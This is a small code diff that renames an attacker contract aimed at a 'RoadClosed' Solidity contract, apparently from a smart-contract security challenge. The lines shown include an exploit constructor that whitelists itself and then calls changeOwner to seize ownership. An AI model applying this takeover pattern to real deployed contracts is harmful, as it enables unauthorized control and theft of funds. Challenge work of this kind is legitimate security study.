@@ -59,7 +59,7 @@ contract RoadClosed {
     }
 }
 
-contract AttackerContract {
+contract AttackerContract_RoadBlock {
     constructor (address target) payable {
         RoadClosed(target).addToWhitelist(address(this));
         RoadClosed(target).changeOwner(address(this));
